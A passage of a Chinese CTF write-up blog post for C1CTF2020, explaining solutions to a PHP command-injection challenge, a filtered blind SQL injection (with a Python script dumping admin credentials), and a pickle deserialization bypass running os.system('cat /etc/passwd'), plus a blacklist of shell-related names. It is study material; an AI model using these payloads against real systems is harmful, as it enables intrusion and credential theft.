+    <span class="token variable">$escaped_cmd</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$search</span><span class="token punctuation">,</span> <span class="token variable">$replace</span><span class="token punctuation">,</span> <span class="token variable">$escaped_cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$escaped_cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>命令注入题，简单说一下怎么回事，只把第一个分号前的语句进行处理，但允许出现被转义的分号，即\;<br>使用了escapeshellcmd函数，回顾一下escapeshellcmd，就是把所有可能执行多条语句的符号全部转义，成对的引号不会被转义，管道符分号回车什么的都会被转义，就确保只能执行一条命令，对整个字符串进行了escapeshellcmd，再把原字符串中单引号包裹的内容匹配起来，将引号内escapeshellcmd后的内容又给替换回来</p>
+<p>一开始想着单引号内的字符不受影响，就想办法在单引号里放反斜杠转义掉单引号来逃逸，试了半天没试成功，并且发现好像一切和我的思路并不一致</p>
+<h3 id="转义与单双引号"><a href="#转义与单双引号" class="headerlink" title="转义与单双引号"></a>转义与单双引号</h3><p>坑爹单引号，以前单是知道单引号能忽略$美元符号的变量解析，没想到单引号是最牛逼的，单引号内的所有字符均无效，包括转义字符<br>双引号是无效大部分特殊字符，但是转义字符，美元符号之类的部分还有效，如果不用引号包裹的话，还会有很多元字符会生效，比如<code>= &amp; ! |</code>等等<br>成对的单引号没法被转义，只要有一个半开单引号shell就会等待另一个单引号闭合，你输入啥都没用，而’\‘这样的序列则会直接被认为是一个反斜杠<br>这个点真的是我调试了好久，最后才发现的。。。<br>最后去查了文章<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/mydomain/archive/2011/10/15/2213017.html">shell转义，单引号与双引号，反撇号</a></p>
+<p>所以题目防御看起来很完美，单引号外的字符全部转义，单引号内的字符不会被转义但完全失去效果</p>
+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>我当初对着答案看了好久也没看出来怎么回事。。。最后调试调试歪打正着的懂了<br>正则处写的是<code>/\&#39;[^\&#39;]+\&#39;/</code>两个引号内使用的是+，也就是说引号内如果为空是不会被匹配的<br>那么构造如下输入</p>
+<pre class=" language-shell"><code class="language-shell">aaa'
+'''
+'whoami'
+</code></pre>
+<p>这时正则匹配到的是<code>&#39;\n&#39;</code>这样子一个序列，而三个连着的引号处的那对空引号不会被匹配，这样子导致了正则匹配和实际引号匹配的失配，原本暴露在引号对外的换行符被认为是包裹在引号对内，而避免了被转义，而命令注入除了分号能分隔命令外，换行也能，system函数其实就是把你的输入输入到shell里直接运行，成功完成了利用<br>这里有一个小点，就是单引号包裹的命令也是能直接跑的，并且单引号包裹的其实就是指其内部所有字符均是字符字面值，并且可以直接和别的字符串拼起来，所以不仅是<code>&#39;ls&#39; -l /</code>可行，就连<code>&#39;who&#39;ami</code>都是可以跑起来的</p>
+<p>说实话，我感觉我学到的东西好多</p>
+<h2 id="make-big-news’-revenge"><a href="#make-big-news’-revenge" class="headerlink" title="make_big_news’ revenge"></a>make_big_news’ revenge</h2><p>普通版本的就没看了，强化版的多了几个过滤<br>显然id处可注入，id&#x3D;1会有特朗普字样<br>简单测试知过滤了空格，union，等号引号<br>头一次遇上SQL注入没有database函数的，我就说我本地测通了实际上也存在盲注怎么就是database()这里打不通。。结果就是一开始试图爆database()半天没反应，以为不是mysql，测了一下又感觉不像其他的，最后问rmb神仙，他告诉我他启动mysql的时候没用use xxx。并且select还是写的select xx from xx.xx这种形式。。。所以database()为NULL。。。。</p>
+<p>头一次查怎么拿到所有数据库<code>select schema_name from information_schema.schemata</code>虽然能猜出来是在information_schema，不过在哪个表里真不知道。。。<br>接下来的倒是没什么东西了，空格用&#x2F;**&#x2F;代替，括号构造的好其实还不需要，引号没了指定库名表名进行查询的时候用16进制代替，最后查字段的时候记得用xx.xx的形式库名表名均指定</p>
+<p>上脚本</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://42.192.184.223:25566/?id="</span>
+
+
+result <span class="token operator">=</span> <span class="token string">''</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p <span class="token operator">=</span> <span class="token number">0</span>
+    q <span class="token operator">=</span> <span class="token number">256</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        m <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">+</span>q<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
+        <span class="token comment" spellcheck="true"># news payload = "0 or ascii(substr((select group_concat(schema_name)from(information_schema.schemata)),{},1))>{}".replace(' ', '/**/').format(str(i), str(m))</span>
+        <span class="token comment" spellcheck="true"># admin payload = "0 or ascii(substr((select group_concat(table_name)from(information_schema.tables)where(table_schema)like(0x6e657773)),{},1))>{}".replace(' ', '/**/').format(str(i), str(m))</span>
+        <span class="token comment" spellcheck="true"># username,,password payload = "0 or ascii(substr((select group_concat(column_name)from(information_schema.columns)where(table_name)like(0x61646d696e)),{},1))>{}".replace(' ', '/**/').format(str(i), str(m))</span>
+        payload <span class="token operator">=</span> <span class="token string">"0 or ascii(substr((select group_concat(username,0x3a,password)from(news.admin)),{},1))>{}"</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'/**/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payload<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">"特朗普"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            <span class="token comment" spellcheck="true"># print(1)</span>
+            p <span class="token operator">=</span> m
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            q <span class="token operator">=</span> m
+        <span class="token keyword">if</span> q <span class="token operator">-</span> p <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
+            result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>q<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+</code></pre>
+<p>昨天嘶吼注完今天又注，这个还是轻松一点。。昨天注了一天今天感觉思路清晰一点了</p>
+<h2 id="BuyAndSell"><a href="#BuyAndSell" class="headerlink" title="BuyAndSell"></a>BuyAndSell</h2><p>发现自己原来对AES和pickle的理解都不够深入，双重的垃圾呜呜</p>
+<p>提供了初始化，买卖看源码几个功能，钱就100只能买垃圾，先看init路由，签发了两个cookie，一个看起来很像jwt，另一个纯十六进制的感觉，像jwt就放到jwt里面去解码，结果发现是个flask的cookie，不过flask和jwt的cookie都存在明文部分，其实也就是base64，直接解码base64都行</p>
+<p>cookie明文是算法和密钥，算法用的AES-128-CFB，就给了这么点东西，估摸着就是解码那个16进制的cookie看看下一步怎么整了，然后这个解码我整了差不多一个下午呜呜</p>
+<p>所以需要先基本理解一下AES加解密什么情况</p>
+<h3 id="AES加解密过程"><a href="#AES加解密过程" class="headerlink" title="AES加解密过程"></a>AES加解密过程</h3><p>AES是对称密钥加密的分组密码，使用CFB反馈模式的时候需要一个初始向量iv，之前学密码学的时候就普通的认为加密解密方都同步持有iv，但今天应用起来这并不现实<br>一开始没注意这个，想了好久<br>使用的是python的pycryptodome模块，不知道为什么python3下面用不起来，用的Python2写的</p>
+<p>就看pycryptodome文档的示例，它是这么实现的</p>
+<pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
+<span class="token operator">>></span><span class="token operator">></span>
+<span class="token operator">>></span><span class="token operator">></span> key <span class="token operator">=</span> b<span class="token string">'Sixteen byte key'</span>
+<span class="token operator">>></span><span class="token operator">></span> cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CFB<span class="token punctuation">)</span>
+<span class="token operator">>></span><span class="token operator">></span> msg <span class="token operator">=</span> cipher<span class="token punctuation">.</span>iv <span class="token operator">+</span> cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>b<span class="token string">'Attack at dawn'</span><span class="token punctuation">)</span>
+</code></pre>
+<p>发送消息时，直接将iv放在密文的前面发送，而解密的时候，前16位作为iv截取下来，再对16位之后的密文进行解密<br>函数如下</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    iv <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>
+    data <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
+    aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CFB<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>
+    data <span class="token operator">=</span> aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> data
+</code></pre>
+<p>而新创建的cipher对象若不显式指定iv，会随机初始化iv，这样子会导致解密错误，不过由于CFB模式的特殊性，错误的传递是有限的，就算是对<code>msg = cipher.iv + cipher.encrypt(b&#39;Attack at dawn&#39;)</code>这样的内容直接使用库解密函数，不进行如上初始向量和数据的划分，直接用新建对象的随机iv进行解密，也能得到正确的明文，因为随机初始化的iv把消息前面发送过来的iv解码出乱码(这本来就没用，被我们丢弃)，而接下来解码明文时使用的却是发送过来数据的前16字节，也就是正确的iv。<br>（不过说实话，这听起来更像CBC，因为CFB应该不是刚好iv和密文分组大小一致的）<br>在这个类似CBC的CFB模式下，解码函数可以简写为</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CFB<span class="token punctuation">)</span>
+    data <span class="token operator">=</span> aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
+    <span class="token keyword">return</span> data
+</code></pre>
+<p>也正是这个错误传递的有限性，导致了另一个有意思的点，也耽误了我几个小时的时间<br>因为一开始并没有理解AES的加密方式，所以直接将获得的iv+cipher的消息解密，得到了乱码开头的数据拼上有用的明文，然后直接修改明文重新加密，也不需要发送什么iv，直接把加密掉的数据一股脑的发送出去，发现也能成功解密出明文<br>也就是这么个伪代码形式的东西也跑的通</p>
+<pre class=" language-python"><code class="language-python">cipher <span class="token operator">=</span> xxx <span class="token comment" spellcheck="true"># 这是iv+cipher的标准形式</span>
+plain <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CFB<span class="token punctuation">)</span><span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 直接带iv使用新产生的随机iv解密，得到一个16字节奇怪数据+明文的结果</span>
+cipher_new <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CFB<span class="token punctuation">)</span><span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 再进行一波强行加密，使用随机的iv，并且加密的数据还是16字节奇怪字符+明文</span>
+<span class="token keyword">print</span> decrypt<span class="token punctuation">(</span>cipher_new<span class="token punctuation">,</span> key<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 结果只有正确的明文</span>
+</code></pre>
+<p>了解了这个类CBC的CFB的模式就能知道，每一组的加解密依赖于前一组，所以在明文前面加16字节奇怪的数据并不影响加解密，因为明文的加解密都依赖于前面这16字节的怪数据，随机产生的iv只影响这16字节的怪数据，刚好这个这个16字节的冗余数据就隔断了实际数据受到的随机初始向量的影响</p>
+<p>真的这个点坑了我好久。。。我感觉我和rmb神仙都绕进去了，他自己写的东西都记不清了</p>
+<p>然后我们说了这么大一堆乱七八糟的，实际上就直接解码，能拿到16字节乱码加数据，其实就可以看到加密内容是什么了，但是由于我过于愚蠢打不通，所以以为是加密的问题</p>
+<h3 id="Pickle反序列化"><a href="#Pickle反序列化" class="headerlink" title="Pickle反序列化"></a>Pickle反序列化</h3><p>以前手搓过不少pickle了，自认为其实还蛮懂，但是就掌握几个常用的opcode，今天面对原生opcode还是傻眼了，然后犯了几个低级错误，搞了一下午加一晚上，又懒得看python源码，事实上也没多难，后来看了眼源码一下就猜出来什么情况了，呜呜<br>pickle作为栈语言，操作就是各种出入栈<br>一步步分析一下python原生的opcode序列</p>
+<pre class=" language-python"><code class="language-python">\x80\x03capp
+User
+q\x00<span class="token punctuation">)</span>\x81q\x01<span class="token punctuation">}</span>q\x02<span class="token punctuation">(</span>X\x05\x00\x00\x00moneyq\x03K_X\x05\x00\x00\x00itemsq\x04<span class="token punctuation">]</span>q\x05X\x04\x00\x00\x00goldq\x06aub<span class="token punctuation">.</span>
+</code></pre>
+<pre><code>\x80 指定pickle协议版本，这里的版本是3，手搓的一般是0版本
+c 引入app.User，压入栈顶
+q 输入单字节参数，不知道有什么用，每次出现q后面的数字加一，类似计数器
+) 压入空元组
+\x81 查找不到详解，pickle源码注释为build object by applying cls.__new__ to argtuple使用class的new属性，以元组为参数，构造类对象 后来读到题目源码的时候发现User类不存在构造函数，应该是把空元祖和app.User弹出来整了一个实例User对象压回去
+q 又输入了奇奇怪怪的东西
+&#125; 压入空字典
+q 再输入一个奇怪的东西
+( 压入MARK
+X utf-8string长度计数，输入5 0 0 0 money (X这个参数无详解也看不懂源码注释说的是什么，暂且这么理解)
+q 再再输入一个奇怪的东西
+K 压入一字节无符号整数，_下划线的ascii码为95
+X 又输入 5 0 0 0 items
+q 再再再输入奇怪的东西
+] 压入空列表
+q 再再再再输入奇怪的东西
+X 输入 4 0 0 0 gold
+q 再再再再再输入奇怪的东西
+
+此时栈结构从栈底到栈顶为 User &#123;&#125; MARK 长度为5的字符串money 无符号整数95 长度为5的字符串items [] 长度为4的字符串gold
+
+a 将栈的第一个元素append到第二个元素(必须为列表)中  此时栈内容变成User &#123;&#125; MARK money 95 items [&#39;gold&#39;]
+u     寻找栈中的上一个MARK，组合之间的数据(数据必须有偶数个，即呈key-value对)并全部添加或更新到该MARK之前的一个元素(必须为字典)中 栈变为User &#123;&quot;money&quot;:95, items:[&quot;gold&quot;]&#125;
+b 调用__dict__.update() 使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置 用字典的键值对User的属性进行赋值
+. 结束
+</code></pre>
+<p>其实也没必要分析这么多，你就看到X后面跟了个数字，然后看到pickle源码里写着counted UTF-8 string argument，就能估摸出个大概了。。也就是说修改内容的时候记得顺便改一下对应的X后面对应的长度<br>一开始就直接把gold修改成了source_code，就一直500，我一直怀疑是自己加解密有问题，最后发现原生的pickle还是和手搓的不一样，这些参数都是自己指定长度的，不像以前一个S随便压字符串<br>不过手搓压字符串是因为类有构造函数，所以直接调用构造函数当然是以字符串作为参数，不过这里没有构造函数，是构造空对象然后构造字典再update过去</p>
+<p>然后，到这一步才算拿到源码，我已经学死了，我好弱呜呜呜<br>服务以及都关了，还有一个java题不看了，反序列化真不会，没有rmb教我可能上面好多题都不会呜呜呜呜呜呜呜呜<br>明天看一下源码打，感觉是个手搓命令执行，应该不会太难了（吧）</p>
+<h3 id="反序列化限制绕过"><a href="#反序列化限制绕过" class="headerlink" title="反序列化限制绕过"></a>反序列化限制绕过</h3><p>就放源码反序列化限制相关的内容</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">RestrictedUnpickler</span><span class="token punctuation">(</span>Unpickler<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment" spellcheck="true"># Only allow safe classes</span>
+        <span class="token keyword">if</span> <span class="token string">'app'</span> <span class="token operator">==</span> module<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">and</span> <span class="token string">"__"</span> <span class="token operator">not</span> <span class="token keyword">in</span> name<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> getattr<span class="token punctuation">(</span>modules<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
+        <span class="token comment" spellcheck="true"># Forbid everything else.</span>
+        <span class="token keyword">raise</span> UnpicklingError<span class="token punctuation">(</span><span class="token string">"global '%s.%s' is forbidden"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">restricted_loads</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    black_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">'"'</span> <span class="token punctuation">,</span><span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span> <span class="token string">'posix'</span><span class="token punctuation">,</span> <span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'commands'</span><span class="token punctuation">]</span>
+
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> black_list<span class="token punctuation">:</span>
+        <span class="token keyword">if</span> i<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> s<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> None
+
+    <span class="token keyword">return</span> RestrictedUnpickler<span class="token punctuation">(</span>BytesIO<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<p>可以看到使用restricted_loads禁止出现这些字样出现在opcode里，还专门encode了一下，encode参数留空默认为utf8，可能是因为输入是byte类型，所以encode一下才能比较？<br>重写find_class函数，find_class在c,i这几个opcode引入对象时会被调用，限制模块的前三个字符一定是app，且导入的类或方法中不能存在双下划线</p>
+<p>说实话，以前好像没见过在find_class之外还整一个restricted_loads来进行额外限制的<br>restricted_loads的限制可以用opcode V来绕过，V表示压入一个Unicode的字符串，这样子就能完全的绕过black_list但又能被解析</p>
+<p>主要还是要看怎么绕过find_class，第一步用c来获取对象的时候，还是不能用Unicode的，所以还是要看看app里面都有什么，简单浏览了一下import进来的东西，有两个比较有意思的东西</p>
+<h4 id="getattr-amp-amp-sys-modules"><a href="#getattr-amp-amp-sys-modules" class="headerlink" title="getattr&amp;&amp;sys.modules"></a>getattr&amp;&amp;sys.modules</h4><p>getattr感觉不太能被禁用，因为本身就是find_class函数调用的部分，且也属于python builtin的内置函数<br>利用getattr绕过find_class应该是pickle中经常出现的操作，在find_class中获取一个getattr，再通过getattr获取实际想获取的方法模块之类的</p>
+<p>sys.modules以前没学过，现在学习了呜呜</p>
+<blockquote>
+<p>sys 模块包含了系统级的信息，像正在运行的 Python 的版本 (sys.version 或 sys.version_info)，和系统级选项，像最大允许递归的深度 (sys.getrecursionlimit() 和 sys.setrecursionlimit())。<br>sys.modules 是一个字典，它包含了从 Python 开始运行起，被导入的所有模块。键字就是模块名，键值就是模块对象。<strong>请注意除了你的程序导入的模块外还有其它模块。</strong>Python 在启动时预先装入了一些模块，如果你在一个 Python IDE 环境下，sys.modules 包含了你在 IDE 中运行的所有程序所导入的所有模块。</p>
+</blockquote>
+<p>本地试了一下，即使没有显式导入os，但sys.modules仍能获取到os，想了半天为什么会自动导入os，后来rmb神仙告诉我原来是导入的其他库导入了os，太强了</p>
+<h3 id="payload详解"><a href="#payload详解" class="headerlink" title="payload详解"></a>payload详解</h3><p>编写payload，我太弱了，这里是直接抄的rmb的payload</p>
+<pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> b<span class="token triple-quoted-string string">'''capp
+getattr
+p1
+(capp
+modules
+V\\u0067\\u0065\\u0074    # get
+tR(V\\u006f\\u0073        # os
+tRp2
+g1
+(g2
+V\\u0073\\u0079\\u0073\\u0074\\u0065\\u006d        # system
+tR(V\\u0063\\u0061\\u0074\\u0020\\u002f\\u0065\\u0074\\u0063\\u002f\\u0070\\u0061\\u0073\\u0073\\u0077\\u0064        # payload
+tR.'''</span>
+</code></pre>
+<p>pickle的存储空间分为栈和memo，memo是一个队列，p和g就是把栈上数据put到memo，或者把memo中的数据get到栈上<br>python Unicode解码直接用str.decode(“unicode-escape”)</p>
+<p>python源码里关于opcode的注释过于抽象。。。还是找的文章看的opcode具体操作</p>
+<pre><code>c 向栈顶压入app.getattr
+p1 将app.getattr放到memo上去，位置为1
+( 压入一个MARK
+c 压入app.modules
+V 压入字符串get
+t 将MARK之上的数据弹出，作为一个元组压入，即此时栈内数据为 app.getattr (app.modules, &quot;get&quot;)
+R 弹出栈顶两个元素，栈顶下的元素为可执行对象，栈顶为参数（栈顶必须为元组），执行该函数，将结果压回栈中 即执行getattr(modules, &quot;get&quot;)，返回一个modules.get函数对象 此时栈中元素为getattr modules.get
+(V 同上，压入MARK和字符串os
+tR 同上，调用modules.get(&quot;os&quot;)，将os对象压回栈中 栈中数据为 getattr os
+p2 将os对象放入memo，位置为2
+g1 把memo位置1的元素getattr压入栈
+(g2 压入MARK，把memo位置2的元素os压入栈
+V 压入字符串system
+tR 同上，调用getattr(os,&#39;system&#39;)，获取到函数os.system
+(V 压入MARK和payload
+tR 将payload弹出，调用os.system(payload)
+. 结束
+</code></pre>
+<h3 id="opcode详解文章"><a href="#opcode详解文章" class="headerlink" title="opcode详解文章"></a>opcode详解文章</h3><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://xz.aliyun.com/t/7436#toc-12">https://xz.aliyun.com/t/7436#toc-12</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a></p>
+<p>太感谢rmb神仙手把手教我了，三天高强度学习感觉学到好多东西呜呜</p>
+<h2 id="官方wp"><a href="#官方wp" class="headerlink" title="官方wp"></a>官方wp</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://c1sec.hfut.edu.cn/writeup/C1CTF_2020.html">https://c1sec.hfut.edu.cn/writeup/C1CTF_2020.html</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SQLI/" rel="tag"># SQLI</a>
+              <a href="/tags/pickle/" rel="tag"># pickle</a>
+              <a href="/tags/AES/" rel="tag"># AES</a>
+              <a href="/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" rel="tag"># 命令注入</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%5BRoarCTF2020%5Dwp.html" rel="prev" title="[RoarCTF2020]wp">
+      <i class="fa fa-chevron-left"></i> [RoarCTF2020]wp
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/Python%E7%89%B9%E6%AE%8A%E5%B1%9E%E6%80%A7.html" rel="next" title="Python特殊属性">
+      Python特殊属性 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#C1CTF2020-wp"><span class="nav-number">1.</span> <span class="nav-text">[C1CTF2020]wp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#php-tricks"><span class="nav-number">1.1.</span> <span class="nav-text">php_tricks</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php-tricks%E2%80%99-revenge"><span class="nav-number">1.2.</span> <span class="nav-text">php_tricks’ revenge</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A1%BA%E5%BA%8F"><span class="nav-number">1.2.1.</span> <span class="nav-text">反序列化顺序</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#best-toolkit"><span class="nav-number">1.3.</span> <span class="nav-text">best_toolkit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BD%AC%E4%B9%89%E4%B8%8E%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7"><span class="nav-number">1.3.1.</span> <span class="nav-text">转义与单双引号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3"><span class="nav-number">1.3.2.</span> <span class="nav-text">题解</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#make-big-news%E2%80%99-revenge"><span class="nav-number">1.4.</span> <span class="nav-text">make_big_news’ revenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BuyAndSell"><span class="nav-number">1.5.</span> <span class="nav-text">BuyAndSell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AES%E5%8A%A0%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B"><span class="nav-number">1.5.1.</span> <span class="nav-text">AES加解密过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.5.2.</span> <span class="nav-text">Pickle反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="nav-number">1.5.3.</span> <span class="nav-text">反序列化限制绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#getattr-amp-amp-sys-modules"><span class="nav-number">1.5.3.1.</span> <span class="nav-text">getattr&amp;&amp;sys.modules</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload%E8%AF%A6%E8%A7%A3"><span class="nav-number">1.5.4.</span> <span class="nav-text">payload详解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#opcode%E8%AF%A6%E8%A7%A3%E6%96%87%E7%AB%A0"><span class="nav-number">1.5.5.</span> <span class="nav-text">opcode详解文章</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%98%E6%96%B9wp"><span class="nav-number">1.6.</span> <span class="nav-text">官方wp</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
